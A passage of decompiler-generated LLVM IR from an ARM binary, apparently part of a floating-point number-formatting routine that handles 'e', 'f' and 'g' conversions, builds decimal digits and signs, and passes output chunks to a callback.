  br i1 %v6_1a8c8, label %dec_label_pc_1a8d0, label %dec_label_pc_1a8f4

dec_label_pc_1a8d0:                               ; preds = %dec_label_pc_1a8c8
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33069), i32* %r3.global-to-local, align 4
  %v1_1a8e0 = sub i32 -1, %v0_1a8c8
  store i32 %v1_1a8e0, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_1a8e8 = inttoptr i32 %v1_1a8e8 to i32*
  store i32 176, i32* %v2_1a8e8, align 4
  %v0_1a8ec = load i32, i32* %r7.global-to-local, align 4
  %v1_1a8ec = add i32 %v0_1a8ec, 4
  %v2_1a8ec = inttoptr i32 %v1_1a8ec to i32*
  %v3_1a8ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1a8ec, i32* %v2_1a8ec, align 4
  %v4_1a8ec = add i32 %v0_1a8ec, 8
  %v5_1a8ec = inttoptr i32 %v4_1a8ec to i32*
  %v6_1a8ec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1a8ec, i32* %v5_1a8ec, align 4
  %v0_1a8f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a8f0 = add i32 %v0_1a8f0, 12
  store i32 %v1_1a8f0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a8f4

dec_label_pc_1a8f4:                               ; preds = %dec_label_pc_1a8c8, %dec_label_pc_1a8d0
  %v2_1a8fc = phi i32 [ %v1_1a8e8, %dec_label_pc_1a8c8 ], [ %v1_1a8f0, %dec_label_pc_1a8d0 ]
  %v0_1a8f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a8f4 = icmp eq i32 %v0_1a8f4, 0
  store i1 %v2_1a8f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a8f4, label %.thread47, label %bb249

bb249:                                            ; preds = %dec_label_pc_1a8f4
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_1a8fc = inttoptr i32 %v2_1a8fc to i32*
  store i32 112, i32* %v3_1a8fc, align 4
  %v1_1a900 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a900 = load i32, i32* %r7.global-to-local, align 4
  %v3_1a900 = add i32 %v2_1a900, 8
  %v4_1a900 = inttoptr i32 %v3_1a900 to i32*
  store i32 %v1_1a900, i32* %v4_1a900, align 4
  %v1_1a904 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a904 = load i32, i32* %r7.global-to-local, align 4
  %v3_1a904 = add i32 %v2_1a904, 4
  %v4_1a904 = inttoptr i32 %v3_1a904 to i32*
  store i32 %v1_1a904, i32* %v4_1a904, align 4
  %v1_1a908 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a908 = add i32 %v1_1a908, 12
  store i32 %v2_1a908, i32* %r7.global-to-local, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_1a8f4, %bb249
  %v1_1a940 = phi i32 [ %v2_1a8fc, %dec_label_pc_1a8f4 ], [ %v2_1a908, %bb249 ]
  %v0_1a90c = load i32, i32* %sb.global-to-local, align 4
  %v7_1a90c = icmp eq i32 %v0_1a90c, 103
  store i1 %v7_1a90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a90c, label %dec_label_pc_1a914, label %dec_label_pc_1a91c

dec_label_pc_1a914:                               ; preds = %.thread47
  %v0_1a914 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a914 = icmp eq i32 %v0_1a914, 0
  store i1 %v2_1a914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a914, label %dec_label_pc_1a94c, label %dec_label_pc_1a91c

dec_label_pc_1a91c:                               ; preds = %.thread47, %dec_label_pc_1a914
  %v0_1a91c = load i32, i32* %lr.global-to-local, align 4
  %v1_1a91c = load i32, i32* %ip.global-to-local, align 4
  %v2_1a91c = sub i32 %v1_1a91c, %v0_1a91c
  store i32 %v2_1a91c, i32* %r1.global-to-local, align 4
  %v1_1a920 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a920 = sub i32 %v2_1a91c, %v1_1a920
  %v4_1a920 = xor i32 %v1_1a920, %v2_1a91c
  %v5_1a920 = xor i32 %v2_1a920, %v2_1a91c
  %v6_1a920 = and i32 %v5_1a920, %v4_1a920
  %v7_1a920 = icmp slt i32 %v6_1a920, 0
  %v8_1a920 = icmp slt i32 %v2_1a920, 0
  %v9_1a920 = icmp eq i32 %v2_1a91c, %v1_1a920
  store i1 %v9_1a920, i1* %cpsr_z.global-to-local, align 1
  %v2_1a924 = xor i1 %v8_1a920, %v7_1a920
  br i1 %v2_1a924, label %dec_label_pc_1a928, label %dec_label_pc_1a94c

dec_label_pc_1a928:                               ; preds = %dec_label_pc_1a91c
  %v2_1a934 = sub i32 %v1_1a920, %v2_1a91c
  store i32 %v2_1a934, i32* %r1.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33069), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_1a940 = inttoptr i32 %v1_1a940 to i32*
  store i32 176, i32* %v2_1a940, align 4
  %v0_1a944 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a944 = add i32 %v0_1a944, 4
  %v2_1a944 = inttoptr i32 %v1_1a944 to i32*
  %v3_1a944 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1a944, i32* %v2_1a944, align 4
  %v4_1a944 = add i32 %v0_1a944, 8
  %v5_1a944 = inttoptr i32 %v4_1a944 to i32*
  %v6_1a944 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1a944, i32* %v5_1a944, align 4
  %v0_1a948 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a948 = add i32 %v0_1a948, 12
  store i32 %v1_1a948, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a94c

dec_label_pc_1a94c:                               ; preds = %dec_label_pc_1a91c, %dec_label_pc_1a914, %dec_label_pc_1a928
  %v1_1a9e0.pre.pre = phi i32 [ %v1_1a940, %dec_label_pc_1a91c ], [ %v1_1a940, %dec_label_pc_1a914 ], [ %v1_1a948, %dec_label_pc_1a928 ]
  %v0_1a94c = load i32, i32* %r8.global-to-local, align 4
  %v7_1a94c = icmp eq i32 %v0_1a94c, 102
  store i1 %v7_1a94c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a94c, label %dec_label_pc_1a9d4, label %dec_label_pc_1a954

dec_label_pc_1a954:                               ; preds = %dec_label_pc_1a94c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a958 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a958 = icmp slt i32 %v0_1a958, 0
  %v2_1a958 = icmp eq i32 %v0_1a958, 0
  store i1 %v2_1a958, i1* %cpsr_z.global-to-local, align 1
  %v4_1a95c = select i1 %tmp275, i32 %v4_1a678126130, i32 101
  store i32 %v4_1a95c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_1a96c = sub i32 0, %v0_1a958
  %storemerge158 = select i1 %v1_1a958, i32 %v4_1a96c, i32 %v0_1a958
  %tmp271 = ashr i32 %v0_1a958, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_1a974 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_1a974, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a97c

dec_label_pc_1a97c:                               ; preds = %dec_label_pc_1a9ac, %dec_label_pc_1a97c, %dec_label_pc_1a954
  %v2_1a994 = phi i32 [ %v2_1a974, %dec_label_pc_1a954 ], [ %v6_1a994, %dec_label_pc_1a97c ], [ %v6_1a994, %dec_label_pc_1a9ac ]
  %v0_1a98c = phi i32 [ %storemerge158, %dec_label_pc_1a954 ], [ %v2_1a998, %dec_label_pc_1a97c ], [ %v2_1a998, %dec_label_pc_1a9ac ]
  %v3_1a984 = urem i32 %v0_1a98c, 10
  %v1_1a988 = or i32 %v3_1a984, 48
  store i32 %v1_1a988, i32* %r3.global-to-local, align 4
  store i32 %v0_1a98c, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1a994 = trunc i32 %v1_1a988 to i8
  %v3_1a994 = add i32 %v2_1a994, -1
  %v4_1a994 = inttoptr i32 %v3_1a994 to i8*
  store i8 %v1_1a994, i8* %v4_1a994, align 1
  %v5_1a994 = load i32, i32* %r6.global-to-local, align 4
  %v6_1a994 = add i32 %v5_1a994, -1
  store i32 %v6_1a994, i32* %r6.global-to-local, align 4
  %v0_1a998 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a998 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a998 = sdiv i32 %v0_1a998, %v1_1a998
  store i32 %v2_1a998, i32* %r0.global-to-local, align 4
  %v0_1a99c = load i32, i32* %r8.global-to-local, align 4
  %v1_1a99c = add i32 %v0_1a99c, 1
  store i32 %v1_1a99c, i32* %r8.global-to-local, align 4
  %v7_1a9a0 = icmp eq i32 %v1_1a99c, 3
  store i1 %v7_1a9a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1a998, i32* %r5.global-to-local, align 4
  br i1 %v7_1a9a0, label %dec_label_pc_1a97c, label %dec_label_pc_1a9ac

dec_label_pc_1a9ac:                               ; preds = %dec_label_pc_1a97c
  %v2_1a9ac = icmp eq i32 %v2_1a998, 0
  store i1 %v2_1a9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a9ac, label %dec_label_pc_1a9b4, label %dec_label_pc_1a97c

dec_label_pc_1a9b4:                               ; preds = %dec_label_pc_1a9ac
  %v1_1a9b4 = add i32 %v5_1a994, -2
  store i32 %v1_1a9b4, i32* %r3.global-to-local, align 4
  %v0_1a9b8 = load i32, i32* %sl.global-to-local, align 4
  %v1_1a9b8 = trunc i32 %v0_1a9b8 to i8
  %v4_1a9b8 = inttoptr i32 %v1_1a9b4 to i8*
  store i8 %v1_1a9b8, i8* %v4_1a9b8, align 1
  %v0_1a9bc = load i32, i32* %r3.global-to-local, align 4
  %v1_1a9bc = add i32 %v0_1a9bc, -1
  store i32 %v1_1a9bc, i32* %r2.global-to-local, align 4
  %v0_1a9c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a9c0 = trunc i32 %v0_1a9c0 to i8
  %v4_1a9c0 = inttoptr i32 %v1_1a9bc to i8*
  store i8 %v1_1a9c0, i8* %v4_1a9c0, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_1a9c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a9c8 = inttoptr i32 %v0_1a9c8 to i32*
  store i32 112, i32* %v1_1a9c8, align 4
  %v3_1a9c8 = add i32 %v0_1a9c8, 4
  %v4_1a9c8 = inttoptr i32 %v3_1a9c8 to i32*
  %v5_1a9c8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_1a9c8, i32* %v4_1a9c8, align 4
  %v0_1a9cc = load i32, i32* %r2.global-to-local, align 4
  %v1_1a9cc = load i32, i32* %r7.global-to-local, align 4
  %v2_1a9cc = add i32 %v1_1a9cc, 8
  %v3_1a9cc = inttoptr i32 %v2_1a9cc to i32*
  store i32 %v0_1a9cc, i32* %v3_1a9cc, align 4
  %v0_1a9d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a9d0 = add i32 %v0_1a9d0, 12
  store i32 %v1_1a9d0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a9d4

dec_label_pc_1a9d4:                               ; preds = %dec_label_pc_1a94c, %.thread124, %dec_label_pc_1a9b4
  %v1_1a9e0.pre = phi i32 [ %v2_1a4ac, %.thread124 ], [ %v1_1a9d0, %dec_label_pc_1a9b4 ], [ %v1_1a9e0.pre.pre, %dec_label_pc_1a94c ]
  %v2_1a9d4 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1a9d4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a9d8

dec_label_pc_1a9d8:                               ; preds = %dec_label_pc_1a9d8, %dec_label_pc_1a9d4
  %v0_1a9d8 = phi i32 [ %v2_1a9d4, %dec_label_pc_1a9d4 ], [ %v4_1a9d8, %dec_label_pc_1a9d8 ]
  %stack_var_-188.0 = phi i32 [ %v3_1a348, %dec_label_pc_1a9d4 ], [ %v2_1a9e4, %dec_label_pc_1a9d8 ]
  %v1_1a9d8 = inttoptr i32 %v0_1a9d8 to i32*
  %v2_1a9d8 = load i32, i32* %v1_1a9d8, align 4
  store i32 %v2_1a9d8, i32* %r3.global-to-local, align 4
  %v4_1a9d8 = add i32 %v0_1a9d8, 12
  store i32 %v4_1a9d8, i32* %r2.global-to-local, align 4
  %v3_1a9e0 = icmp ult i32 %v4_1a9d8, %v1_1a9e0.pre
  %v2_1a9e4 = sub i32 %stack_var_-188.0, %v2_1a9d8
  store i32 %v2_1a9e4, i32* %ip.global-to-local, align 4
  br i1 %v3_1a9e0, label %dec_label_pc_1a9d8, label %dec_label_pc_1a9f0

dec_label_pc_1a9f0:                               ; preds = %dec_label_pc_1a9d8
  %v3_1a9f0 = load i8, i8* %stack_var_-46, align 1
  %v4_1a9f0 = sext i8 %v3_1a9f0 to i32
  store i32 %v4_1a9f0, i32* %r3.global-to-local, align 4
  store i32 %v4_1a9f0, i32* %r2.global-to-local, align 4
  %v2_1a9f4 = icmp eq i8 %v3_1a9f0, 0
  store i1 %v2_1a9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a9f4, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_1a9f0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_1a9f0, %bb253
  %v1_1aa54 = phi i32 [ %v4_1a9f0, %dec_label_pc_1a9f0 ], [ 1, %bb253 ]
  %v2_1a9fc = sub i32 %v2_1a9e4, %v1_1aa54
  store i32 %v2_1a9fc, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1aa04 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_1aa04, i32* %r3.global-to-local, align 4
  %v2_1aa08 = icmp eq i32 %v2_1a9fc, 0
  store i1 %v2_1aa08, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_1a9fc, 1
  br i1 %tmp255, label %dec_label_pc_1aa70, label %dec_label_pc_1aa1c

dec_label_pc_1aa1c:                               ; preds = %bb254
  %v3_1aa1c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1aa1c, i32* %lr.global-to-local, align 4
  %v1_1aa20 = add i32 %v3_1aa1c, 12
  %v2_1aa20 = inttoptr i32 %v1_1aa20 to i32*
  %v3_1aa20 = load i32, i32* %v2_1aa20, align 4
  store i32 %v3_1aa20, i32* %r3.global-to-local, align 4
  %v1_1aa24 = and i32 %v3_1aa20, 8
  %v2_1aa24 = icmp eq i32 %v1_1aa24, 0
  store i1 %v2_1aa24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1aa24, label %dec_label_pc_1aa48, label %dec_label_pc_1aa2c

dec_label_pc_1aa2c:                               ; preds = %dec_label_pc_1aa1c
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33069), i32* %r3.global-to-local, align 4
  %v1_1aa3c = add i32 %v1_1a9e0.pre, 12
  store i32 %v1_1aa3c, i32* %r6.global-to-local, align 4
  %v1_1aa40 = inttoptr i32 %v1_1a9e0.pre to i32*
  store i32 160, i32* %v1_1aa40, align 4
  %v3_1aa40 = add i32 %v1_1a9e0.pre, 4
  %v4_1aa40 = inttoptr i32 %v3_1aa40 to i32*
  %v5_1aa40 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1aa40, i32* %v4_1aa40, align 4
  %v6_1aa40 = add i32 %v1_1a9e0.pre, 8
  %v7_1aa40 = inttoptr i32 %v6_1aa40 to i32*
  %v8_1aa40 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_1aa40, i32* %v7_1aa40, align 4
  br label %dec_label_pc_1aa74

dec_label_pc_1aa48:                               ; preds = %dec_label_pc_1aa1c
  store i32 %v3_1aa1c, i32* %ip.global-to-local, align 4
  %v1_1aa4c = add i32 %v3_1aa1c, 16
  %v2_1aa4c = inttoptr i32 %v1_1aa4c to i32*
  %v3_1aa4c = load i32, i32* %v2_1aa4c, align 4
  store i32 %v3_1aa4c, i32* %r3.global-to-local, align 4
  %v7_1aa50 = icmp eq i32 %v3_1aa4c, 48
  store i1 %v7_1aa50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1aa50, label %.thread55.thread71, label %bb256

bb256:                                            ; preds = %dec_label_pc_1aa48
  store i32 %v2_1a9e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1aa70

.thread55.thread71:                               ; preds = %dec_label_pc_1aa48
  %v4_1aa5c = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_1a9e0.pre, i32* %r6.global-to-local, align 4
  %v3_1aa64 = add i32 %v4_1aa5c, %v2_1a9fc
  store i32 %v3_1aa64, i32* %r3.global-to-local, align 4
  store i32 %v3_1aa64, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1aa74

dec_label_pc_1aa70:                               ; preds = %bb256, %bb254
  store i32 %v1_1a9e0.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1aa74

dec_label_pc_1aa74:                               ; preds = %.thread55.thread71, %dec_label_pc_1aa2c, %dec_label_pc_1aa70
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1aa78 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1aa78, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1aa7c

dec_label_pc_1aa7c:                               ; preds = %dec_label_pc_1aaa4, %dec_label_pc_1aa74
  %v0_1aa7c = phi i32 [ %v1_1aa98, %dec_label_pc_1aaa4 ], [ %v2_1aa78, %dec_label_pc_1aa74 ]
  %v1_1aa7c = inttoptr i32 %v0_1aa7c to i32*
  %v2_1aa7c = load i32, i32* %v1_1aa7c, align 4
  store i32 %v2_1aa7c, i32* %r1.global-to-local, align 4
  %v3_1aa7c = add i32 %v0_1aa7c, 4
  %v4_1aa7c = inttoptr i32 %v3_1aa7c to i32*
  %v5_1aa7c = load i32, i32* %v4_1aa7c, align 4
  store i32 %v5_1aa7c, i32* %r2.global-to-local, align 4
  %v6_1aa7c = add i32 %v0_1aa7c, 8
  %v7_1aa7c = inttoptr i32 %v6_1aa7c to i32*
  %v8_1aa7c = load i32, i32* %v7_1aa7c, align 4
  store i32 %v8_1aa7c, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 109200, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_1aa90 = load i32, i32* %r5.global-to-local, align 4
  %v1_1aa90 = add i32 %v0_1aa90, 4
  %v2_1aa90 = inttoptr i32 %v1_1aa90 to i32*
  %v3_1aa90 = load i32, i32* %v2_1aa90, align 4
  store i32 %v3_1aa90, i32* %r3.global-to-local, align 4
  %v0_1aa94 = load i32, i32* %r0.global-to-local, align 4
  %v9_1aa94 = icmp eq i32 %v0_1aa94, %v3_1aa90
  store i1 %v9_1aa94, i1* %cpsr_z.global-to-local, align 1
  %v1_1aa98 = add i32 %v0_1aa90, 12
  store i32 %v1_1aa98, i32* %r5.global-to-local, align 4
  br i1 %v9_1aa94, label %dec_label_pc_1aaa4, label %bb257

bb257:                                            ; preds = %dec_label_pc_1aa7c
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1aac4

dec_label_pc_1aaa4:                               ; preds = %dec_label_pc_1aa7c
  %v0_1aaa8.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1aaa4 = load i32, i32* %r6.global-to-local, align 4
  %v3_1aaa4 = icmp ult i32 %v1_1aa98, %v1_1aaa4
  %v9_1aaa4 = icmp eq i32 %v1_1aa98, %v1_1aaa4
  store i1 %v9_1aaa4, i1* %cpsr_z.global-to-local, align 1
  %v2_1aaa8 = add i32 %v0_1aaa8.pre, %v3_1aa90
  store i32 %v2_1aaa8, i32* %r7.global-to-local, align 4
  br i1 %v3_1aaa4, label %dec_label_pc_1aa7c, label %dec_label_pc_1aac4

dec_label_pc_1aabc:                               ; preds = %.thread22, %bb239
  %v0_1aabc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1aabc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a7bc

dec_label_pc_1aac4:                               ; preds = %dec_label_pc_1aaa4, %bb257
  %v0_1aac4 = phi i32 [ -1, %bb257 ], [ %v2_1aaa8, %dec_label_pc_1aaa4 ]
  store i32 %v0_1aac4, i32* %r0.global-to-local, align 4
  store i32 %v27_1a300, i32* @lr, align 4
  ret i32 %v0_1aac4

; uselistorder directives
  uselistorder i32 %v0_1aac4, { 1, 0 }
  uselistorder i32 %v1_1aaa4, { 1, 0 }
  uselistorder i32 %v1_1aa98, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1aa7c, { 2, 1, 0 }
  uselistorder i32 %v3_1aa1c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1a9e4, { 0, 1, 3, 2 }
  uselistorder i32 %v4_1a9d8, { 1, 2, 0 }
  uselistorder i32 %v0_1a9d8, { 1, 0 }
  uselistorder i32 %v1_1a9e0.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_1a998, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_1a994, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_1a958, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_1a920, { 1, 0 }
  uselistorder i32 %v1_1a920, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1a91c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_1a87c, { 2, 1, 0 }
  uselistorder i32 %v2_1a7fc, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_1a7ec, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_1a7d8, { 1, 0, 2 }
  uselistorder i32 %v5_1a7d4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1a86431, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_1a78c, { 1, 0 }
  uselistorder i32 %v1_1a784, { 1, 2, 0 }
  uselistorder i32 %v2_1a778, { 1, 0 }
  uselistorder i32 %v1_1a778, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a778, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_1a748, { 1, 0 }
  uselistorder i32 %v0_1a748, { 0, 2, 1 }
  uselistorder i32 %v2_1a744, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_1a730, { 1, 0 }
  uselistorder i1 %v2_1a720, { 1, 0 }
  uselistorder i32 %v1_1a71c, { 3, 2, 1, 0 }
  uselistorder i32 %v2_1a718, { 1, 0 }
  uselistorder i1 %v2_1a708, { 1, 0 }
  uselistorder i32 %v1_1a6fc, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_1a6b0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a6b0, { 1, 0, 2 }
  uselistorder i1 %v2_1a698, { 1, 0 }
  uselistorder i32 %v5_1a680, { 1, 0 }
  uselistorder i32 %v0_1a66c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a654, { 1, 2, 0 }
  uselistorder i32 %v2_1a650, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1a5e8, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a590, { 1, 0 }
  uselistorder double %v2_1a554, { 1, 0 }
  uselistorder i32 %v0_1a510, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_1a504, { 1, 0 }
  uselistorder i32 %v2_1a540, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1a4d4, { 1, 0 }
  uselistorder i32 %v5_1a490, { 1, 0 }
  uselistorder i32 %v1_1a3b0.v0_1a39c6, { 1, 0 }
  uselistorder i32 %v3_1a46c, { 1, 0 }
  uselistorder i32 %v0_1a448, { 0, 2, 3, 1 }
  uselistorder i32 %v2_1a430, { 2, 1, 0 }
  uselistorder i32 %v0_1a414, { 1, 0 }
  uselistorder i32 %v0_1a334, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 4, 5, 3, 0, 6, 7, 8 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 8, 7, 9, 10, 5, 6, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 7, 0, 8, 1, 2, 3, 4, 9, 6, 10, 11, 13, 14, 16, 5, 17, 18, 12, 19, 15, 20, 21, 22 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 10, 11, 6, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 4, 5, 6, 8, 7, 0, 1, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 22, 20, 21, 23, 24, 25, 26, 27, 28, 29, 31, 45, 32, 36, 33, 34, 35, 37, 30, 38, 39, 40, 41, 42, 43, 44, 64, 47, 46, 48, 49, 18, 19, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 13, 14, 15, 16, 17, 21, 18, 22, 23, 19, 20, 24, 25, 26, 29, 27, 28, 30, 31, 9, 11, 10, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 12, 13, 17, 14, 15, 18, 19, 16, 20, 21, 22, 23, 0, 24, 25, 26, 6, 7, 8, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 8, 25, 9, 10, 20, 17, 18, 21, 12, 13, 19, 14, 15, 3, 22, 16, 4, 23, 24, 1, 2, 11, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 11, 23, 24, 25, 26, 27, 28, 29, 30, 12, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 10, 44, 45, 46, 47, 8, 9, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 160, { 0, 1, 3, 2 }
  uselistorder i32 176, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder i32 57, { 2, 0, 1 }
  uselistorder i32 102, { 1, 2, 3, 4, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33048), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33072), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
